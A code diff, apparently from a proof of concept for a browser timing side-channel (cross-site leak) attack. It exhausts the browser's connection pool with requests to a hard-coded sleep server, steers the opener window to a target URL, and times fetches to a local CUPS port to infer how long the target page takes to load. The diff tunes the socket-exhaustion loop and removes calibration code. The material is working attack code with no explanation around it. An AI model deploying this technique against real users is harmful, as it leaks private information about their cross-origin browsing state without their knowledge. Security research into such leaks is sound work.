@@ -7,8 +7,7 @@ const short_sleep = 0.2;
 const sock_cnt_start = 250;
 const sleep_server_ip = '104.155.96.42';
 const sleep_server_port = 1337;
-let test_server_url = '';
-let test_server_timing = 0;
+const test_server_url = 'http://127.0.0.1:631/';
 
 function log(s) {
   document.getElementById('log').insertRow(-1).innerText = `[*] ${s}`;
@@ -16,7 +15,11 @@ function log(s) {
 
 async function time_fetch() {
   let start = window.performance.now();
-  await fetch(test_server_url, {mode: 'no-cors', cache: 'no-cache'});
+  try {
+    await fetch(test_server_url, {mode: 'no-cors', cache: 'no-cache'});
+  } catch {
+    await new Promise(r=>{setTimeout(r, 0)});
+  }
   let end = window.performance.now();
   return end - start;
 }
@@ -26,7 +29,7 @@ function timeout(ms) {
 }
 
 function fetch_sleep(i, t) {
-  return fetch(`http://${i}.${sleep_server_ip}.xip.io:${sleep_server_port}/sleep?t=${t}`, {mode: 'no-cors', cache: 'no-cache'});
+  return fetch(`http://${i}.${sleep_server_ip}.xip.io:${sleep_server_port}/sleep?t=${t}`, {mode: 'no-cors'});
 }
 
 async function block_socket(i) {
@@ -36,22 +39,28 @@ async function block_socket(i) {
 }
 
 async function exhaust_sockets() {
-  for (let i = 0; i < 255; i++) {
+  let i = 1;
+  for (; i < sock_cnt_start; i++) {
     block_socket(i);
   }
-  log('blocked 255 connections');
+  for (; i < 300; i++) {
+    let promise = fetch_sleep(0, short_sleep);
+    let fetch_time = await time_fetch();
+    await Promise.resolve(promise);
+    if (fetch_time >= short_sleep*1000) {
+      break;
+    }
+    block_socket(i);
+  }
+  log('used ' + (i-1) + ' connections');
 }
 
-async function time_page_loads(url, timing_cnt=20) {
+async function time_page_loads(url, timing_cnt=512) {
   log(`timing "${url}"`);
   let timings = new Array();
   window.opener.location = url;
   for (let i = 0; i < timing_cnt; i++) {
-    let timing = await time_fetch();
-    if (timing <= test_server_timing) {
-      continue;
-    }
-    let val = Math.round((timing-test_server_timing)*1000)/1000;
+    let val = Math.round(await time_fetch()*1000)/1000;
     if (val >= 10) {
       timings.push(val);
     }
@@ -59,26 +68,7 @@ async function time_page_loads(url, timing_cnt=20) {
   return timings;
 }
 
-async function choose_test_server_url() {
-  const cups_url = 'http://127.0.0.1:631/';
-  try {
-    await fetch(cups_url, {mode: 'no-cors', cache: 'no-cache'});
-    test_server_url = cups_url;
-  } catch {
-    test_server_url = 'http://www.google.com/csi';
-  }
-}
-
 async function doit(target) {
-  await choose_test_server_url();
-  log(`Using "${test_server_url}" for congestion test.`)
-  log('Overhead samples:');
-  log(await time_fetch(test_server_url));
-  log(await time_fetch(test_server_url));
-  log(await time_fetch(test_server_url));
-  log(await time_fetch(test_server_url));
-  test_server_timing = await time_fetch(test_server_url);
-  log(`Subtracting ${test_server_timing} from measurements.`);
   log('Exhausting connection pool');
   await exhaust_sockets();
   let timings = await time_page_loads(target);
